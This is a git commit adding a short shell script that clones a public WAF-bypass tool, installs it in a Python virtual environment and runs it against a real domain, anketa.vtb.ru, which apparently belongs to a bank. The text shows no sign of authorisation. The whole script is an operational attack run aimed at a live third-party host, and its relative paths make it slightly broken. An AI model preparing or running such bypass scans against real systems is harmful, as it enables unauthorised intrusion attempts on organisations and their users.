94e7324511f24b7136c93fe569179c0ed28b2cb2
R <repitae@gmail.com>
2024-04-05 16:25:19 +0300

    Create waf-bypass.sh

---
+++ temp/waf-bypass.sh
@@ -0,0 +1,5 @@
+git clone https://github.com/nemesida-waf/waf_bypass.git /opt/waf-bypass/
+sudo  apt install python3-venv
+python3 -m venv /opt/waf-bypass/
+./bin/python3 -m pip install -r ./requirements.txt
+./bin/python3 /opt/waf-bypass/main.py --host='anketa.vtb.ru'
